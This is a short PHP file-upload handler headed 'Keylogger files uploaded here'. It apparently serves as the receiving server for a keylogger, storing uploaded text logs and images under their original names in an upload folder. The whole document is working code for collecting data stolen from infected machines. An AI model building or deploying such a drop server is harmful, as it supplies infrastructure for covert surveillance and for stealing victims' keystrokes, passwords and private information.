
<html>
  <h1>Keylogger files uploaded here</h1>
</html>
<?php

if(isset($_FILES['file'])){
  
  $file = $_FILES['file'];
  
  //properties
  $file_name = $file['name'];
  $file_tmp = $file['tmp_name'];
  $file_size = $file['size'];
  $file_error = $file['error'];

  // file extensions
  $file_ext = explode('.', $file_name);
  $file_ext = strtolower(end($file_ext));

  //Allowed file types
  $allowed = array("txt", "jpg", "jpeg", "png");

  if(in_array($file_ext, $allowed)){
    if($file_error === 0){
      if($file_size <= 2000000){
        

        //reate unique file name
        // $file_name_new = uniqid('', true) . '.' . $file_ext;
        // Keep the original file name

        // if you want unique name each time just uncomment  the $file_name_new and pass it to the line below instead of $filename
        $file_destination = 'upload/' . $file_name;

        if(move_uploaded_file($file_tmp, $file_destination)){
          echo "Upload successful";
        } else {
          echo "Upload failed";
        }

      } else {
        echo "File size too big";
      }
    } else {
      echo "Upload error";
    }
  } else {
    echo "File type not allowed";
  }

}

?>
